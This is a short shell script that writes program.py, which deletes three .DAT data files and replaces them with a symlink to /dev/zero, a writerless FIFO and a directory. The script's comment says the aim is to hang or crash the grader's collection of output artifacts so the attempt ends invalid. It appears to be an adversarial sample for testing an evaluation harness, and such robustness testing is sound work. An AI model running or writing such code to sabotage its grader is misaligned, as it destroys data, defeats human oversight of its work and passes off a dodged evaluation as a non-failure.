#!/bin/sh
# When run, program.py turns the data files the grader reads afterwards into
# an endless device, a FIFO with no writer and a directory, trying to hang or
# crash the collection of Output Artifacts so the attempt ends invalid.
cd /app || exit 1
cat > program.py <<'PY'
import os
import shutil

for name in ("ACCOUNTS.DAT", "BOOKS.DAT", "TRANSACTIONS.DAT"):
    path = os.path.join("data", name)
    if os.path.isdir(path) and not os.path.islink(path):
        shutil.rmtree(path)
    elif os.path.lexists(path):
        os.unlink(path)
os.symlink("/dev/zero", "data/ACCOUNTS.DAT")
os.mkfifo("data/BOOKS.DAT")
os.mkdir("data/TRANSACTIONS.DAT")
PY
